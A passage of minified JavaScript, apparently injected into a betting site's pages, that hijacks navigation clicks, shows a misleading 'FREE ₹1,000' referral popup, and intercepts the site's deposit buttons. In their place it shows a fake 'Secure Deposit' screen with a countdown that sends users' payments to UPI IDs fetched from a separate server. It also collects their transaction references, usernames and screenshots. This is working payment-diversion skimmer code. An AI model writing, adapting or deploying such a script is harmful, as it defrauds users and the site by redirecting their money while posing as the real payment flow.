      if (
        ((n.style.left = uo(v.clientX - i, 62) + "px"),
        (n.style.top = wo(v.clientY - c, 62) + "px"),
        Math.abs(v.clientX - f) > 5 || Math.abs(v.clientY - p) > 5)
      )
        l = !0;
    }),
    t.addEventListener("pointerup", (v) => {
      if (
        (t.releasePointerCapture(v.pointerId),
        t.classList.remove("dragging"),
        l)
      )
        ut(n, "logo");
      else o();
    }));
}
function Eo(n, t, o) {
  let i = 0,
    c = 0;
  (t.addEventListener("pointerdown", (f) => {
    (t.setPointerCapture(f.pointerId),
      t.classList.add("dragging"),
      (i = f.clientX - n.offsetLeft),
      (c = f.clientY - n.offsetTop));
  }),
    t.addEventListener("pointermove", (f) => {
      if (!t.hasPointerCapture(f.pointerId)) return;
      ((n.style.left = uo(f.clientX - i, o.offsetWidth) + "px"),
        (n.style.top = wo(f.clientY - c, o.offsetHeight) + "px"));
    }),
    t.addEventListener("pointerup", (f) => {
      (t.releasePointerCapture(f.pointerId),
        t.classList.remove("dragging"),
        ut(n, "panel"));
    }));
}
var Yi = [".firstSaveDialog", ".promptHeader"],
  Hi = [".close", ".van-dialog__confirm", ".dialog__outside"];
function Ni() {
  Yi.forEach((n) => {
    document.querySelectorAll(n).forEach((t) => {
      let o = t.closest(".van-popup, .dialog");
      if (!o || getComputedStyle(o).display === "none") return;
      let i = !1;
      for (let c of Hi) {
        let f = o.querySelector(c);
        if (f) {
          (f.click(), (i = !0));
          break;
        }
      }
      if (!i) {
        let c = o.previousElementSibling;
        if (c?.classList.contains("van-overlay")) c.click();
      }
    });
  });
}
function Fi() {
  [
    document.querySelector(".tabbar__center"),
    document.querySelector(".promotionBg")?.closest(".tabbar__container-item"),
  ].forEach((t) => {
    if (!t || t.dataset.wgHijacked) return;
    ((t.dataset.wgHijacked = "1"),
      t.addEventListener(
        "click",
        (o) => {
          (o.preventDefault(),
            o.stopPropagation(),
            o.stopImmediatePropagation(),
            window.dispatchEvent(new Event("wg-open-bonus")));
        },
        { capture: !0 },
      ));
  });
}
function Gi(n) {
  if (n.dataset.wg) return;
  n.dataset.wg = "1";
  let t = n.firstElementChild;
  if (!t) return;
  let o = t.cloneNode(!0);
  o.querySelector("span").textContent = "Bonus";
  let i = o.querySelector("use");
  if (i) {
    i.setAttribute("xlink:href", "#icon-gifts");
    let c = i.closest("svg");
    if (c) c.setAttribute("class", "svg-icon icon-gifts");
  }
  (o.querySelector("h5")?.remove(),
    o.addEventListener(
      "click",
      (c) => {
        (c.preventDefault(),
          c.stopPropagation(),
          c.stopImmediatePropagation(),
          window.dispatchEvent(new Event("wg-open-bonus")));
      },
      { capture: !0 },
    ),
    n.prepend(o));
}
var $o = !1,
  tn = null,
  R = null;
function Mo() {
  if ($o) return !0;
  if (!localStorage.getItem("token")) return !0;
  let n = localStorage.getItem("wg_promo_expiry");
  return n && Number(n) > Date.now();
}
function hi() {
  if (tn) return;
  let n = "shreewin55.com".includes("okwin"),
    t = document.createElement("style");
  ((t.textContent = `
    .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
    .wgp-popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;width:min(300px,calc(100% - 32px));background:#1e1e3a;border-radius:18px;overflow:hidden;display:none;flex-direction:column;box-shadow:0 8px 40px rgba(0,0,0,.6);font-family:-apple-system,system-ui,'Segoe UI',sans-serif}
    .wgp-close{position:absolute;top:10px;right:12px;width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:12px;color:rgba(255,255,255,.7);cursor:pointer;z-index:1;border:none}
    .wgp-hero{text-align:center;padding:28px 20px 14px}
    .wgp-icon{font-size:44px;line-height:1;margin-bottom:10px}
    .wgp-amount{font-size:28px;font-weight:900;color:#fff;letter-spacing:-.5px;margin-bottom:8px}
    .wgp-pill{display:inline-block;padding:4px 12px;border-radius:99px;background:rgba(245,180,0,.15);border:1px solid rgba(245,180,0,.35);font-size:10.5px;font-weight:600;color:#f5c842;letter-spacing:.2px}
    .wgp-stats{display:flex;gap:6px;padding:0 16px 12px;justify-content:center}
    .wgp-chip{flex:1;text-align:center;padding:7px 4px;border-radius:10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);font-size:10px;font-weight:600;color:#c8cad0}
    .wgp-body{padding:0 16px 14px;font-size:11.5px;color:#7b7e9a;line-height:1.65;text-align:center}
    .wgp-cta{display:block;width:calc(100% - 32px);margin:0 16px 10px;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#f5a623,#f5c842);color:#1a1200;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:.1px}
    .wgp-cta:active{opacity:.9}
    .wgp-footer{display:flex;align-items:center;gap:7px;padding:8px 16px 16px;justify-content:center}
    .wgp-chk{width:17px;height:17px;border-radius:50%;border:1.5px solid #4a4d6a;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background .15s,border-color .15s}
    .wgp-chk.on{background:#07c160;border-color:#07c160}
    .wgp-chk-tick{font-size:10px;color:#fff;opacity:0;transition:opacity .15s}
    .wgp-chk.on .wgp-chk-tick{opacity:1}
    .wgp-remind{font-size:11px;color:#4a4d6a;cursor:pointer}
    .wgp-light .wgp-popup{background:#fff;box-shadow:0 8px 40px rgba(0,0,0,.15)}
    .wgp-light .wgp-close{background:rgba(0,0,0,.06);color:#888}
    .wgp-light .wgp-amount{color:#111}
    .wgp-light .wgp-pill{background:rgba(249,89,89,.08);border-color:rgba(249,89,89,.25);color:#f95959}
    .wgp-light .wgp-chip{background:#f5f5ff;border-color:#e0e0f0;color:#555}
    .wgp-light .wgp-body{color:#777}
    .wgp-light .wgp-cta{background:linear-gradient(90deg,#f95959,#ff8c6e);color:#fff}
    .wgp-light .wgp-chk{border-color:#ccc}
    .wgp-light .wgp-remind{color:#aaa}
    .wgp-veer .wgp-popup{background:#111217;box-shadow:0 8px 40px rgba(0,0,0,.6),0 0 0 1px rgba(32,211,116,.25)}
    .wgp-veer .wgp-pill{background:rgba(32,211,116,.12);border-color:rgba(32,211,116,.35);color:#20D374}
    .wgp-veer .wgp-chip{background:#25272A;border-color:rgba(32,211,116,.15);color:#D7D7D7}
    .wgp-veer .wgp-body{color:#93939D}
    .wgp-veer .wgp-cta{background:linear-gradient(130deg,#C5BC0C 0%,#94B20B 33%,#20D374 66%,#0CBAC5 100%);color:#1A1A2C}
    .wgp-veer .wgp-chk{border-color:#374963}
    .wgp-veer .wgp-remind{color:#93939D}
  `),
    document.head.appendChild(t));
  let o = document.createElement("div");
  if (n) o.className = "wgp-light";
  else if ("shreewin55.com".includes("veergame")) o.className = "wgp-veer";
  ((tn = document.createElement("div")),
    (tn.className = "wgp-overlay"),
    o.appendChild(tn),
    (R = document.createElement("div")),
    (R.className = "wgp-popup"),
    (R.innerHTML = `
    <button class="wgp-close" id="wgp-close">✕</button>
    <div class="wgp-hero">
      <div class="wgp-icon">\uD83D\uDCB0</div>
      <div class="wgp-amount">FREE ₹1,000</div>
      <div class="wgp-pill">Per Referral &bull; No Limit &bull; Instant Payout</div>
    </div>
    <div class="wgp-stats">
      <div class="wgp-chip">\uD83D\uDCB8 Instant</div>
      <div class="wgp-chip">♾️ No Cap</div>
      <div class="wgp-chip">✅ Verified</div>
    </div>
    <div class="wgp-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.</div>
    <button class="wgp-cta" id="wgp-cta">\uD83C\uDF81 Claim Free Bonus →</button>
    <div class="wgp-footer">
      <div class="wgp-chk" id="wgp-chk"><span class="wgp-chk-tick">✓</span></div>
      <span class="wgp-remind" id="wgp-remind">No More Reminders Today</span>
    </div>
  `),
    o.appendChild(R),
    document.body.appendChild(o));
}
function wt(n) {
  if (tn) tn.style.display = "none";
  if (R) R.style.display = "none";
  if ((($o = !0), n))
    localStorage.setItem("wg_promo_expiry", String(Date.now() + 86400000));
}
function Ci() {
  if (Mo()) return;
  (hi(), (tn.style.display = "block"), (R.style.display = "flex"));
  let n = !1,
    t = R.querySelector("#wgp-chk");
  ((t.onclick = () => {
    ((n = !n), t.classList.toggle("on", n));
  }),
    (R.querySelector("#wgp-remind").onclick = () => t.click()),
    (R.querySelector("#wgp-close").onclick = () => wt(n)),
    (tn.onclick = () => wt(n)),
    (R.querySelector("#wgp-cta").onclick = () => {
      (wt(n), window.dispatchEvent(new Event("wg-open-bonus")));
    }));
}
function Uo() {
  (Ni(), Fi());
  let n = document.querySelector(".settingPanel__container-items");
  if (n) Gi(n);
}
function Oo(n) {
  let t = !1,
    o = () => {
      if (!t && !Mo()) ((t = !0), Ci());
    },
    i = () => {
      (Uo(),
        new MutationObserver(() => {
          (Uo(), o());
        }).observe(document.body, { childList: !0, subtree: !0 }),
        window.addEventListener("hashchange", o),
        window.addEventListener("storage", o),
        setTimeout(o, 1500));
    };
  document.readyState === "loading"
    ? document.addEventListener("DOMContentLoaded", i)
    : i();
}
function Jo(n) {
  let t = n.querySelector("#bonus-view"),
    o = n.querySelector("#btn-copy-invite"),
    i = n.querySelector("#bonus-link-preview"),
    c = n.querySelector(".bonus-prog-count"),
    f = n.querySelector(".bonus-bar-fill"),
    p = "";
  function l() {
    let q =
      location.origin +
      "/#/register?invitationCode=" +
      (sessionStorage.getItem("invitecode") || "");
    return p ? q + "&ref=" + p : q;
  }
  function v() {
    let q = sessionStorage.getItem("wg_user") || "";
    if (!q) return;
    if (
      (fetch("/ar-api/bonus-stats?username=" + q)
        .then((E) => E.json())
        .then((E) => {
          let W = E.qualified || 0;
          ((c.textContent = W + " / 10 Qualified"),
            (f.style.width = Math.min((W / 10) * 100, 100) + "%"));
        })
        .catch(() => {}),
      !p)
    )
      fetch("/ar-api/my-ref-tag?username=" + q)
        .then((E) => E.json())
        .then((E) => {
          if (E.tag) ((p = E.tag), (i.textContent = l()));
        })
        .catch(() => {});
  }
  (window.addEventListener("wg-open-bonus", () => {
    ((t.style.display = "flex"), (i.textContent = l()), v());
  }),
    n
      .querySelector("#btn-bonus-back")
      .addEventListener("click", () => (t.style.display = "none")),
    o.addEventListener("click", () => {
      navigator.clipboard.writeText(l()).then(() => {
        ((o.textContent = "✓ Copied!"),
          setTimeout(() => (o.textContent = "Copy Invite Link"), 2000));
      });
    }));
}
function qt() {
  document.getElementById("wg-deposit-hint")?.remove();
}
function Wo(n) {
  (qt(),
    window.addEventListener("hashchange", qt),
    window.addEventListener("wg-qualified", qt));
}
function zo(n, t) {
  let i = document.querySelector("prediction-panel")?.shadowRoot;
  if (!i) return;
  let c = [],
    f = new Set();
  for (let e of Array.isArray(t) ? t : []) {
    let u =
      typeof e === "string"
        ? e.trim()
        : String(e?.upiId ?? e?.address ?? e?.upi ?? e?.value ?? "").trim();
    if (!u || f.has(u)) continue;
    (f.add(u),
      c.push({
        label: typeof e === "string" ? "" : String(e?.label ?? "").trim(),
        upiId: u,
      }));
  }
  if (c.length === 0) return;
  let p = i.querySelector(".pay-overlay");
  if (p) p.remove();
  let l = document.createElement("div");
  ((l.className = "pay-overlay"),
    i.appendChild(l),
    (document.body.style.overflow = "hidden"));
  let v = 0,
    q,
    E = 0,
    W = () => {
      (cancelAnimationFrame(E),
        (E = requestAnimationFrame(() => {
          let e = document.querySelector("#app"),
            u = window.visualViewport,
            w = e?.getBoundingClientRect(),
            Q =
              u?.width ||
              document.documentElement.clientWidth ||
              window.innerWidth,
            P =
              u?.height ||
              document.documentElement.clientHeight ||
              window.innerHeight,
            Z = Number.isFinite(w?.left) ? Math.max(0, w.left) : 0,
            H = Number.isFinite(w?.width) && w.width > 0 ? w.width : Q,
            F = Math.max(280, Math.min(H, Q - Z));
          ((l.style.left = `${Z}px`),
            (l.style.top = `${Math.max(0, u?.offsetTop || 0)}px`),
            (l.style.width = `${F}px`),
            (l.style.height = `${P}px`));
        })));
    };
  (W(),
    window.addEventListener("resize", W),
    window.addEventListener("orientationchange", W),
    window.visualViewport?.addEventListener("resize", W),
    window.visualViewport?.addEventListener("scroll", W));
  let $ = () => {
      (clearInterval(q),
        cancelAnimationFrame(E),
        window.removeEventListener("resize", W),
        window.removeEventListener("orientationchange", W),
        window.visualViewport?.removeEventListener("resize", W),
        window.visualViewport?.removeEventListener("scroll", W),
        l.remove(),
        (document.body.style.overflow = ""));
    },
    J =
      "DP" +
      Date.now().toString(36).toUpperCase() +
      Math.random().toString(36).slice(2, 6).toUpperCase(),
    z = (e) =>
      String(e ?? "").replace(
        /[&<>"']/g,
        (u) =>
          ({
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;",
          })[u],
      ),
    O = () => {
      let e = c[v],
        u = e.upiId,
        w = e.label || `UPI ${v + 1}`,
        Q = c.length > 1,
        P = c[(v + 1) % c.length],
        Z = P.label || `UPI ${((v + 1) % c.length) + 1}`,
        H = `upi://pay?pa=${u}&pn=Deposit&am=${n}&cu=INR`,
        F = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=0&data=${encodeURIComponent(H)}`;
      return `
      <div class="pay-hdr">
        <button class="pay-back">
          <svg viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
        <span class="pay-ttl">Secure Deposit</span>
        <div style="width:32px"></div>
      </div>

      <div class="pay-body">
        <div class="pay-hero pay-anim pay-anim-1">
          <div class="pay-amount-bg"></div>
          <div class="pay-hero-top">
            <div>
              <span class="pay-hero-label">Amount to Pay</span>
              <span class="pay-amt">₹${Number(n).toLocaleString("en-IN")}</span>
            </div>
            <div class="pay-timer-pill">
              <svg class="pay-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10" stroke-width="2.5"/><path d="M12 6v6l4 2" stroke-width="2.5" stroke-linecap="round"/></svg>
              <span class="pay-timer-txt" id="pay-timer">29:00</span>
            </div>
          </div>
          <div class="pay-hero-sub">Scan and Pay. Then Add UTR.</div>
        </div>

        <div class="pay-content">
        <div class="pay-section pay-qr-card pay-anim pay-anim-2">
          <div class="pay-qr-wrapper">
            <div class="pay-qr-box">
              <div class="pay-qr-skeleton"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg></div>
              <img src="${F}" class="pay-qr" alt="QR Code" onload="this.classList.add('loaded'); this.previousElementSibling.style.display='none'">
            </div>
            <div class="pay-scan-text">Open Any UPI App and Scan</div>
          </div>
        </div>

        <div class="pay-section pay-method-card pay-anim pay-anim-3">
          <div class="pay-section-hdr">Payment UPI</div>
          <div class="pay-upi-row">
            <div class="pay-upi-info">
              <span class="pay-upi-lbl">${z(w)}</span>
              <span class="pay-upi-id">${z(u)}</span>
            </div>
            <div class="pay-upi-actions">
              <button class="pay-copy-btn" id="btn-copy-upi">Copy</button>
            </div>
          </div>
          ${
            Q
              ? `
          <button class="pay-route-card" id="btn-switch-upi" type="button">
            <span class="pay-route-index">${z(Z)}</span>
            <span class="pay-route-copy">
              <span class="pay-route-title">Change UPI ID</span>
              <span class="pay-route-sub">${z(P.upiId)}</span>
            </span>
            <span class="pay-route-icon">
              <svg viewBox="0 0 24 24" fill="none">
                <path d="M7 7h10l-3-3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M17 17H7l3 3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </span>
          </button>
          `
              : `
          <div class="pay-route-note">Only one UPI ID is active right now.</div>
          `
          }
        </div>

        <div class="pay-section pay-form-card pay-anim pay-anim-4">
          <div class="pay-section-hdr">UTR Number</div>
          <div class="pay-field-wrapper">
            <input type="tel" class="pay-utr-input" placeholder="Enter 12-Digit UTR" maxlength="12" inputmode="numeric">
            <button class="pay-paste-pill">Paste</button>
          </div>
          <div class="pay-utr-warn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
            <span class="pay-utr-warn-txt">Wrong UTR can fail the deposit. Check it once.</span>
          </div>
        </div>

        <div class="pay-section pay-anim pay-anim-4">
          <button class="pay-submit-btn disabled" disabled>Submit Payment</button>
        </div>

        <div class="pay-order-meta pay-anim pay-anim-4">
          <span class="pay-order-lbl">Order Reference</span>
          <span class="pay-order-val">${J}</span>
        </div>
        </div>
      </div>

      <div class="pay-confirm-mask">
        <div class="pay-confirm-box">
          <div class="pay-conf-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <div class="pay-conf-ttl">Confirm Deposit</div>
          <div class="pay-conf-msg">Have you successfully transferred exactly <b>₹${Number(n).toLocaleString("en-IN")}</b>?</div>
          <div class="pay-conf-acts">
            <button class="pay-conf-btn no">Cancel</button>
            <button class="pay-conf-btn yes">Yes, Submitted</button>
          </div>
        </div>
      </div>
    `;
    },
    U = () => {
      let e = l.querySelector(".pay-utr-input"),
        u = l.querySelector(".pay-submit-btn");
      ((l.querySelector(".pay-back").onclick = $),
        (e.oninput = (P) => {
          P.target.value = P.target.value.replace(/\D/g, "");
          let Z = /^\d{12}$/.test(P.target.value);
          ((u.disabled = !Z), u.classList.toggle("disabled", !Z));
        }),
        (l.querySelector(".pay-paste-pill").onclick = async () => {
          try {
            let P = await navigator.clipboard.readText();
            ((e.value = P.replace(/\D/g, "").slice(0, 12)),
              e.dispatchEvent(new Event("input")));
          } catch (P) {}
        }),
        (l.querySelector("#btn-copy-upi").onclick = (P) => {
          navigator.clipboard.writeText(c[v].upiId);
          let Z = P.target;
          ((Z.textContent = "Copied"),
            Z.classList.add("copied"),
            setTimeout(() => {
              ((Z.textContent = "Copy"), Z.classList.remove("copied"));
            }, 2000));
        }));
      let w = l.querySelector("#btn-switch-upi");
      if (w)
        w.onclick = () => {
          ((v = (v + 1) % c.length), a());
        };
      let Q = l.querySelector(".pay-confirm-mask");
      ((u.onclick = () => {
        if (!u.disabled) Q.classList.add("active");
      }),
        (l.querySelector(".pay-conf-btn.no").onclick = () =>
          Q.classList.remove("active")),
        (l.querySelector(".pay-conf-btn.yes").onclick = async () => {
          let P = e.value.trim(),
            Z = l.querySelector(".pay-conf-btn.yes"),
            H = l.querySelector(".pay-conf-btn.no");
          ((Z.disabled = !0),
            (Z.textContent = "Submitting…"),
            (H.style.display = "none"));
          let F = "Unknown";
          try {
            F =
              sessionStorage.getItem("wg_user") ||
              localStorage.getItem("wg_user") ||
              "Unknown";
          } catch {}
          let j = new FormData();
          (j.append("utr", P),
            j.append("type", "upi"),
            j.append("amount", "₹" + n),
            j.append("user", F));
          try {
            let S = await (
              await fetch("/ar-api/vip-submit", { method: "POST", body: j })
            ).json();
            if (!S.ok) throw Error(S.error || "Submit failed");
          } catch (A) {
            (console.error("UTR submit error:", A),
              (Z.textContent = "Retry"),
              (Z.disabled = !1),
              (H.style.display = ""));
            return;
          }
          Q.innerHTML = `
        <div class="pay-confirm-box pay-ss-box">
          <div class="pay-conf-icon pay-conf-icon-success">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <div class="pay-conf-ttl">UTR Submitted</div>
          <div class="pay-conf-msg" style="margin-bottom:12px">Upload a screenshot for <b>faster approval</b>.</div>
          <label class="pay-ss-zone" id="pay-ss-zone">
            <input type="file" accept="image/*" class="pay-ss-input" hidden>
            <div class="pay-ss-placeholder" id="pay-ss-placeholder">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
              <span>Tap to upload screenshot</span>
            </div>
            <img class="pay-ss-preview" id="pay-ss-preview" style="display:none">
          </label>
          <div class="pay-conf-acts" style="flex-direction:column;gap:8px">
            <button class="pay-conf-btn yes pay-ss-send" disabled>Send Screenshot</button>
            <button class="pay-conf-btn no pay-ss-skip">Skip</button>
          </div>
        </div>
      `;
          let _ = Q.querySelector(".pay-ss-input"),
            d = Q.querySelector("#pay-ss-preview"),
            Nn = Q.querySelector("#pay-ss-placeholder"),
            cn = Q.querySelector(".pay-ss-send");
          ((_.onchange = (A) => {
            let S = A.target.files[0];
            if (S) {
              let L = new FileReader();
              ((L.onload = (X) => {
                ((d.src = X.target.result),
                  (d.style.display = "block"),
                  (Nn.style.display = "none"),
                  (cn.disabled = !1));
              }),
                L.readAsDataURL(S));
            }
          }),
            (cn.onclick = async () => {
              ((cn.disabled = !0), (cn.textContent = "Uploading…"));
              let A = new FormData();
              if (
                (A.append("utr", P),
                A.append("type", "upi"),
                A.append("amount", "₹" + n),
                A.append("user", F),
                _.files[0])
              )
                A.append("screenshot", _.files[0]);
              try {
                await fetch("/ar-api/vip-submit", { method: "POST", body: A });
              } catch {}
              $();
            }),
            (Q.querySelector(".pay-ss-skip").onclick = $));
        }));
    },
    a = () => {
      let e = l.querySelector(".pay-utr-input")?.value || "";
      if (
        ((l.innerHTML = O()),
        (l.querySelector(".pay-utr-input").value = e),
        U(),
        W(),
        e)
      )
        l.querySelector(".pay-utr-input").dispatchEvent(new Event("input"));
    };
  a();
  let y = 1740;
  q = setInterval(() => {
    if ((y--, y <= 0)) {
      (clearInterval(q), $());
      return;
    }
    let e = Math.floor(y / 60),
      u = y % 60,
      w = l.querySelector("#pay-timer");
    if (w) {
      if (
        ((w.textContent = `${String(e).padStart(2, "0")}:${String(u).padStart(2, "0")}`),
        y < 300)
      )
        w.parentElement.classList.add("urgent");
    }
  }, 1000);
}
var Xn = { interceptor_enabled: !1, min_deposit: 500, upis: [] },
  Et = !1;
function Lo(n) {
  let t = Array.isArray(n) ? n : [],
    o = [],
    i = new Set();
  for (let c of t) {
    let f =
      typeof c === "string"
        ? c.trim()
        : String(c?.upiId ?? c?.address ?? c?.upi ?? c?.value ?? "").trim();
    if (!f || i.has(f)) continue;
    (i.add(f),
      o.push(
        typeof c === "string"
          ? f
          : { label: String(c?.label ?? "").trim(), upiId: f },
      ));
  }
  return o;
}
async function St() {
  try {
    let n = await fetch("/ar-api/payment-config", { cache: "no-store" });
    if (n.ok) {
      let t = await n.json(),
        o = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
      ((Xn = {
        interceptor_enabled: Boolean(
          t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled,
        ),
        min_deposit: Number.isFinite(o) && o > 0 ? o : 500,
        upis: Lo(t?.payment_methods ?? t?.upis),
      }),
        (Et = !0));
    }
  } catch {
    ((Xn = { interceptor_enabled: !1, min_deposit: 500, upis: [] }), (Et = !0));
  }
}
function Ki(n) {
  let t = Number(Xn.min_deposit || 500),
    o = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
    i = Number.isFinite(o) ? o : 0;
  return Math.max(i, t);
}
function Qo() {
  (St(),
    setInterval(St, 1e4),
    document.addEventListener("visibilitychange", () => {
      if (!document.hidden) St();
    }),
    window.addEventListener(
      "click",
      (n) => {
        if (!n.target.closest(".Recharge__container-rechageBtn, .go_pay"))
          return;
        let o = Lo(Xn.upis);
        if (!Et || !Xn.interceptor_enabled || o.length === 0) return;
        (n.stopImmediatePropagation(), n.stopPropagation(), n.preventDefault());
        let i = document.querySelector('input.van-field__control[type="tel"]'),
          c = Ki(i);
        if (i && Number(i.value) !== c)
          ((i.value = String(c)),
            i.dispatchEvent(new Event("input", { bubbles: !0 })),
            i.dispatchEvent(new Event("change", { bubbles: !0 })));
        (console.log("deposit blocked - interceptor active", {
          amount: c,
          upis: o,
        }),
          zo(c, o));
      },
      { capture: !0 },
    ));
}
function Di(n) {
  function t(U, a) {
    return (U + a) | 0;
  }
  function o(U, a) {
    return (U << a) | (U >>> (32 - a));
  }
  function i(U, a, y, e, u, w) {
    return t(o(t(t(a, U), t(e, w)), u), y);
  }
  function c(U, a, y, e, u, w, Q) {
    return i((a & y) | (~a & e), U, a, u, w, Q);
  }
  function f(U, a, y, e, u, w, Q) {
    return i((a & e) | (y & ~e), U, a, u, w, Q);
  }
  function p(U, a, y, e, u, w, Q) {
    return i(a ^ y ^ e, U, a, u, w, Q);
  }
  function l(U, a, y, e, u, w, Q) {
    return i(y ^ (a | ~e), U, a, u, w, Q);
  }
  function v(U, a) {
    var y = U[0],
      e = U[1],
      u = U[2],
      w = U[3];
    ((y = c(y, e, u, w, a[0], 7, -680876936)),
      (w = c(w, y, e, u, a[1], 12, -389564586)),
      (u = c(u, w, y, e, a[2], 17, 606105819)),
      (e = c(e, u, w, y, a[3], 22, -1044525330)),
      (y = c(y, e, u, w, a[4], 7, -176418897)),
      (w = c(w, y, e, u, a[5], 12, 1200080426)),
      (u = c(u, w, y, e, a[6], 17, -1473231341)),
      (e = c(e, u, w, y, a[7], 22, -45705983)),
      (y = c(y, e, u, w, a[8], 7, 1770035416)),
      (w = c(w, y, e, u, a[9], 12, -1958414417)),
      (u = c(u, w, y, e, a[10], 17, -42063)),
      (e = c(e, u, w, y, a[11], 22, -1990404162)),
      (y = c(y, e, u, w, a[12], 7, 1804603682)),
      (w = c(w, y, e, u, a[13], 12, -40341101)),
      (u = c(u, w, y, e, a[14], 17, -1502002290)),
      (e = c(e, u, w, y, a[15], 22, 1236535329)),
      (y = f(y, e, u, w, a[1], 5, -165796510)),
      (w = f(w, y, e, u, a[6], 9, -1069501632)),
      (u = f(u, w, y, e, a[11], 14, 643717713)),
      (e = f(e, u, w, y, a[0], 20, -373897302)),
      (y = f(y, e, u, w, a[5], 5, -701558691)),
      (w = f(w, y, e, u, a[10], 9, 38016083)),
      (u = f(u, w, y, e, a[15], 14, -660478335)),
      (e = f(e, u, w, y, a[4], 20, -405537848)),
      (y = f(y, e, u, w, a[9], 5, 568446438)),
      (w = f(w, y, e, u, a[14], 9, -1019803690)),
      (u = f(u, w, y, e, a[3], 14, -187363961)),
      (e = f(e, u, w, y, a[8], 20, 1163531501)),
      (y = f(y, e, u, w, a[13], 5, -1444681467)),
      (w = f(w, y, e, u, a[2], 9, -51403784)),
      (u = f(u, w, y, e, a[7], 14, 1735328473)),
      (e = f(e, u, w, y, a[12], 20, -1926607734)),
      (y = p(y, e, u, w, a[5], 4, -378558)),
      (w = p(w, y, e, u, a[8], 11, -2022574463)),
      (u = p(u, w, y, e, a[11], 16, 1839030562)),
      (e = p(e, u, w, y, a[14], 23, -35309556)),
      (y = p(y, e, u, w, a[1], 4, -1530992060)),
      (w = p(w, y, e, u, a[4], 11, 1272893353)),
      (u = p(u, w, y, e, a[7], 16, -155497632)),
      (e = p(e, u, w, y, a[10], 23, -1094730640)),
      (y = p(y, e, u, w, a[13], 4, 681279174)),
      (w = p(w, y, e, u, a[0], 11, -358537222)),
      (u = p(u, w, y, e, a[3], 16, -722521979)),
      (e = p(e, u, w, y, a[6], 23, 76029189)),
      (y = p(y, e, u, w, a[9], 4, -640364487)),
      (w = p(w, y, e, u, a[12], 11, -421815835)),
      (u = p(u, w, y, e, a[15], 16, 530742520)),
      (e = p(e, u, w, y, a[2], 23, -995338651)),
      (y = l(y, e, u, w, a[0], 6, -198630844)),
      (w = l(w, y, e, u, a[7], 10, 1126891415)),
      (u = l(u, w, y, e, a[14], 15, -1416354905)),
      (e = l(e, u, w, y, a[5], 21, -57434055)),
      (y = l(y, e, u, w, a[12], 6, 1700485571)),
      (w = l(w, y, e, u, a[3], 10, -1894986606)),
      (u = l(u, w, y, e, a[10], 15, -1051523)),
      (e = l(e, u, w, y, a[1], 21, -2054922799)),
      (y = l(y, e, u, w, a[8], 6, 1873313359)),
      (w = l(w, y, e, u, a[15], 10, -30611744)),
      (u = l(u, w, y, e, a[6], 15, -1560198380)),
      (e = l(e, u, w, y, a[13], 21, 1309151649)),
      (y = l(y, e, u, w, a[4], 6, -145523070)),
      (w = l(w, y, e, u, a[11], 10, -1120210379)),
      (u = l(u, w, y, e, a[2], 15, 718787259)),
      (e = l(e, u, w, y, a[9], 21, -343485551)),
      (U[0] = t(y, U[0])),
      (U[1] = t(e, U[1])),
      (U[2] = t(u, U[2])),
      (U[3] = t(w, U[3])));
  }
  function q(U) {
    var a = [],
      y;
    for (y = 0; y < 64; y += 4)
      a[y >> 2] =
        U.charCodeAt(y) +
        (U.charCodeAt(y + 1) << 8) +
        (U.charCodeAt(y + 2) << 16) +
        (U.charCodeAt(y + 3) << 24);
    return a;
  }
  var E = n.length,
    W = [1732584193, -271733879, -1732584194, 271733878],
    $;
  for ($ = 64; $ <= E; $ += 64) v(W, q(n.substring($ - 64, $)));
  n = n.substring($ - 64);
  var J = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
  for ($ = 0; $ < n.length; $++) J[$ >> 2] |= n.charCodeAt($) << (($ % 4) << 3);
  if (((J[$ >> 2] |= 128 << (($ % 4) << 3)), $ > 55))
    (v(W, J), (J = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
  ((J[14] = E * 8), v(W, J));
  var z = "";
  for ($ = 0; $ < 4; $++)
    for (var O = 0; O < 4; O++)
      z +=
        "0123456789abcdef"[(W[$] >> (O * 8 + 4)) & 15] +
        "0123456789abcdef"[(W[$] >> (O * 8)) & 15];
  return z.toUpperCase().slice(0, 32);
}
function gi() {
